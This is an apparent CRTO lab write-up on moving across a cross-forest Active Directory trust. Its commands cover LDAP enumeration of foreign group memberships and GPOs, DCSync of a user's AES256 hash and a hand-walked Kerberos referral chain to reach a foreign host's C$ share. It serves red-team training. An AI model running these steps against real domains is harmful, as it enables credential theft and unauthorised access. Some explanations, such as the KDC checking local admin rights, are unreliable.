# CRTO — Domain Trusts: Inbound Trust Hop

**Course:** Red Team Ops (CRTO) by RastaMouse — Zero Point Security
**Lab:** Inbound Trusts
**Objective:** Gain access to a foreign domain (partner.com) across a one-way inbound trust by identifying legitimate cross-domain group membership and manually walking the Kerberos referral chain

---

## The Full Chain

```
ldapsearch → enumerate trust (inbound, forest-transitive)
    ↓
Enumerate Foreign Security Principals in partner.com → find CONTOSO SID with membership
    ↓
Identify SID → "Partner Jump Users" group in CONTOSO
    ↓
Enumerate members of Partner Jump Users → find users with cross-domain access
    ↓
nslookup SRV → find par-dc-1.partner.com DC
    ↓
Enumerate GPOs in partner.com → find "Contoso Jump Users" GPO
    ↓
Download GptTmpl.inf → confirm "Contoso Users" group has local admin on all partner.com machines
    ↓
ldapsearch → confirm GPO linked to top-level domain (applies to all computers)
    ↓
Impersonate dyork (CONTOSO DA) → dcsync rsteel's AES256 hash
    ↓
krb_asktgt → get rsteel's TGT using AES256 hash
    ↓
krb_asktgs /service:krbtgt/partner.com → inter-realm referral ticket
    ↓
krb_asktgs /service:cifs/par-jmp-1 /targetdomain:partner.com → CIFS TGS
    ↓
ls \\par-jmp-1.partner.com\c$ → access foreign domain machine as local admin
```

---

## Background — One-Way Inbound Trust

```
CONTOSO → trusts → partner.com   (inbound from CONTOSO's perspective)
```

**Direction from CONTOSO's perspective:**
- `TRUST_DIRECTION_INBOUND (1)` = partner.com trusts CONTOSO
- partner.com users can access CONTOSO resources? **No**
- CONTOSO users can access partner.com resources? **Yes — if granted**

> An inbound trust means the foreign domain (partner.com) trusts our domain (CONTOSO). CONTOSO users can authenticate to partner.com resources, but only if partner.com has explicitly granted them access. The enumeration phase is about finding WHERE that access exists.

**`trustAttributes=8` = `TRUST_ATTRIBUTE_FOREST_TRANSITIVE`** — this is a cross-forest trust (different AD forest), not within-forest. SID filtering is **enabled by default** — the SID history Golden Ticket attack from the Parent-Child lab does not work here.

---

## Phase 1 — Trust Enumeration

### Identify the Trust

```bash
ldapsearch (objectClass=trustedDomain) --attributes trustDirection,trustPartner,trustAttributes,flatname
```

| Attribute | Value | Meaning |
|---|---|---|
| `trustDirection` | `1` | `TRUST_DIRECTION_INBOUND` — partner.com trusts us |
| `trustAttributes` | `8` | `TRUST_ATTRIBUTE_FOREST_TRANSITIVE` — cross-forest trust |
| `trustPartner` | `partner.com` | The trusting foreign domain |

**TTP:** T1482 — Domain Trust Discovery

---

### Enumerate Foreign Security Principals (FSPs)

FSPs are placeholder objects created in a domain when a foreign principal (user or group from a trusted domain) is added to a local group. They represent the cross-domain group membership.

```bash
ldapsearch (objectClass=foreignSecurityPrincipal) \
  --attributes objectSid,memberOf \
  --hostname partner.com \
  --dn DC=partner,DC=com
```

**What this reveals:**
```
objectSid : S-1-5-21-3926355307-1661546229-813047887-6102   ← CONTOSO SID
memberOf  : CN=Contoso Users,CN=Users,DC=partner,DC=com     ← member of partner.com group
```

> A CONTOSO SID (`S-1-5-21-3926355307-...`) appearing as an FSP in partner.com means a CONTOSO principal has been added to a partner.com group. This is the legitimate access path we'll exploit.

---

### Identify the CONTOSO SID

```bash
ldapsearch (objectSid=S-1-5-21-3926355307-1661546229-813047887-6102) \
  --attributes samAccountType,distinguishedName
```

> Result: Domain group called **"Partner Jump Users"** in CONTOSO.

---

### Enumerate Partner Jump Users Members

```bash
ldapsearch "(&(|(samAccountType=805306368)(samAccountType=268435456))(memberof=CN=Partner Jump Users,CN=Users,DC=contoso,DC=com))" \
  --attributes distinguishedName
```

> Returns the users/groups in CONTOSO who are members of Partner Jump Users — and by extension, members of "Contoso Users" in partner.com. Target: **rsteel** (found to be a member).

---

### Find the Foreign Domain Controller

```bash
nslookup _ldap._tcp.dc._msdcs.partner.com 10.10.120.1 SRV
```

> Returns: `par-dc-1.partner.com` — the DC to target for all subsequent partner.com LDAP queries.

---

## Phase 2 — Discovery in the Foreign Domain

### Enumerate GPOs in partner.com

```bash
ldapsearch (objectClass=groupPolicyContainer) \
  --hostname par-dc-1.partner.com \
  --dn DC=partner,DC=com \
  --attributes displayName,gPCFileSysPath
```

> Reveals a GPO called **"Contoso Jump Users"** with its SysVol path.

---

### Download and Parse GptTmpl.inf

```bash
download \\partner.com\SysVol\partner.com\Policies\{DFE606B4-CA59-4AD6-9BCE-55AF35888129}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
```

**What GptTmpl.inf reveals:**
```ini
[Group Membership]
*S-1-5-21-4244029708-1901239654-2578485347-1104__Memberof = *S-1-5-32-544
```

| SID | Meaning |
|---|---|
| `S-1-5-21-4244029708-...-1104` | "Contoso Users" group in partner.com |
| `S-1-5-32-544` | Built-in Administrators (local group) |

This means: Contoso Users → local Administrators on all machines the GPO applies to.

---

### Confirm Contoso Users Group Contains Our CONTOSO SID

```bash
ldapsearch (objectSid=S-1-5-21-4244029708-1901239654-2578485347-1104) \
  --hostname par-dc-1.partner.com \
  --dn DC=partner,DC=com \
  --attributes samAccountType,samAccountName,member
```

> Confirms "Contoso Users" has `S-1-5-21-3926355307-1661546229-813047887-6102` (Partner Jump Users) as a member.

**The full access chain:**
```
rsteel → member of Partner Jump Users (CONTOSO)
              ↓ FSP in partner.com
         Partner Jump Users → member of Contoso Users (partner.com)
              ↓ GPO Restricted Groups
         Contoso Users → local Administrators on partner.com machines
```

---

### Find Where the GPO Is Linked

```bash
ldapsearch "(&(|(objectClass=organizationalUnit)(objectClass=domain))(gPLink=*{DFE606B4-CA59-4AD6-9BCE-55AF35888129}*))" \
  --hostname par-dc-1.partner.com \
  --dn DC=partner,DC=com \
  --attributes objectClass,name
```

> Returns: Linked to the **top-level domain** — applies to all computers in partner.com.

---

### Find Computers in the Foreign Domain

```bash
ldapsearch (samAccountType=805306369) \
  --hostname par-dc-1.partner.com \
  --dn DC=partner,DC=com \
  --attributes distinguishedName
```

> Returns all computer accounts — target: `par-jmp-1.partner.com` (jump server).

---

## Phase 3 — Exploitation: Manual Kerberos Referral Chain

Unlike within-forest trust hops, cross-forest authentication requires manually walking the **Kerberos referral chain** — the KDC doesn't do it automatically when you have a hash.

### Step 1 — Get rsteel's AES256 Hash

```bash
# Impersonate dyork (CONTOSO DA)
steal_token [dyork_pid]    # or make_token

# DCSync rsteel
dcsync contoso.com CONTOSO\rsteel
# Capture: aes256_hmac = 05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960
```

---

### Step 2 — Get rsteel's TGT

```bash
krb_asktgt /user:rsteel /aes256:05579261e29fb01f23b007a89596353e605ae307afcd1ad3234fa12f94ea6960
```

> Sends AS-REQ to CONTOSO KDC with AES256 hash as pre-auth → returns TGT for rsteel in CONTOSO.

---

### Step 3 — Request Inter-Realm Referral Ticket

```bash
krb_asktgs /service:krbtgt/partner.com /ticket:[RSTEEL TGT]
```

**What this does:**
```
rsteel's TGT → TGS-REQ to CONTOSO KDC requesting krbtgt/partner.com
    ↓
CONTOSO KDC sees partner.com trust → issues inter-realm referral ticket
    ↓
Inter-realm ticket is encrypted with the trust key (shared secret between domains)
    ↓
This ticket is proof of rsteel's identity to the partner.com KDC
```

> This is the "referral" step — CONTOSO's KDC hands you a ticket that partner.com's KDC will accept. It's signed with the inter-domain trust key, not the krbtgt hash of either domain.

---

### Step 4 — Request CIFS Service Ticket in Foreign Domain

```bash
krb_asktgs \
  /service:cifs/par-jmp-1.partner.com \
  /targetdomain:partner.com \
  /dc:par-dc-1.partner.com \
  /ticket:[INTER-REALM TICKET]
```

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| `/service` | `cifs/par-jmp-1.partner.com` | Service to request TGS for in the foreign domain |
| `/targetdomain` | `partner.com` | The foreign domain — tells Rubeus which KDC to contact |
| `/dc` | `par-dc-1.partner.com` | The foreign domain's DC to send the TGS-REQ to |
| `/ticket` | Inter-realm ticket | Proof of rsteel's identity to partner.com KDC |

**What happens:**
```
Inter-realm ticket → TGS-REQ to par-dc-1.partner.com
    ↓
par-dc-1 decrypts inter-realm ticket using trust key → validates rsteel's identity
par-dc-1 checks: is rsteel (via Partner Jump Users → Contoso Users) local admin on par-jmp-1?
    YES → issues TGS for cifs/par-jmp-1.partner.com
```

---

### Step 5 — Access the Foreign Domain Machine

```bash
# Inject the CIFS TGS
make_token CONTOSO\rsteel FakePass
kerberos_ticket_use [path to cifs TGS]
run klist

# Access par-jmp-1
ls \\par-jmp-1.partner.com\c$
```

---

## The Kerberos Referral Chain Visualised

```
rsteel AES256 hash
    ↓ krb_asktgt
CONTOSO TGT for rsteel
    ↓ krb_asktgs /service:krbtgt/partner.com
Inter-realm referral ticket (signed with trust key)
    ↓ krb_asktgs /service:cifs/par-jmp-1 /targetdomain:partner.com /dc:par-dc-1
CIFS TGS for par-jmp-1.partner.com (signed by par-dc-1 KDC)
    ↓ kerberos_ticket_use + ls
Access to par-jmp-1\c$
```

---

## Inbound Trust vs Parent-Child Trust Comparison

| Property | Parent-Child (within-forest) | Inbound (cross-forest) |
|---|---|---|
| `trustAttributes` | `32` (WITHIN_FOREST) | `8` (FOREST_TRANSITIVE) |
| SID Filtering | Disabled | **Enabled** |
| SID History Attack | Works | **Blocked** |
| Attack method | Golden Ticket + `/sids` | Manual Kerberos referral chain |
| Access granted by | SID history injection | Legitimate group membership |
| Requires | Child krbtgt AES256 | Target user's AES256 hash |

---

## MITRE ATT&CK Mapping

| TTP | Technique | Detail |
|---|---|---|
| T1482 | Domain Trust Discovery | ldapsearch trust + FSP enumeration |
| T1003.006 | DCSync | Extract rsteel's AES256 hash |
| T1558.003 | Kerberoasting (adjacent) | krb_asktgt uses hash for AS-REQ |
| T1550.003 | Pass the Ticket | Inject inter-realm + CIFS tickets |
| T1078.002 | Valid Accounts: Domain Accounts | Authenticate as rsteel across trust |

---

## Key Takeaways

- `trustDirection=1` (INBOUND) = **partner.com trusts us** — CONTOSO users can access partner.com if granted rights
- `trustAttributes=8` (FOREST_TRANSITIVE) = cross-forest trust = **SID filtering enabled** — Golden Ticket + `/sids` does not work here
- **Foreign Security Principals** are the key enumeration target — they reveal which CONTOSO principals have been granted access in partner.com
- The access chain is: rsteel → Partner Jump Users → Contoso Users (FSP in partner.com) → local Administrators via GPO Restricted Groups
- Cross-forest Kerberos requires **three steps**: TGT → inter-realm referral → service TGS. You cannot skip directly to the service ticket.
- `krb_asktgs /service:krbtgt/partner.com` is the inter-realm step — this is the most commonly missed command in this chain
- `/targetdomain:` and `/dc:` flags on the final `krb_asktgs` tell Rubeus to send the TGS-REQ to the **foreign domain's KDC**, not CONTOSO's
- `nslookup _ldap._tcp.dc._msdcs.<domain> <DC_IP> SRV` is the standard way to find DCs in a domain you don't have DNS for
- This attack exploits **legitimate access** — rsteel genuinely has admin rights on par-jmp-1 through the group chain. No exploitation of a vulnerability, just proper enumeration of intended access.
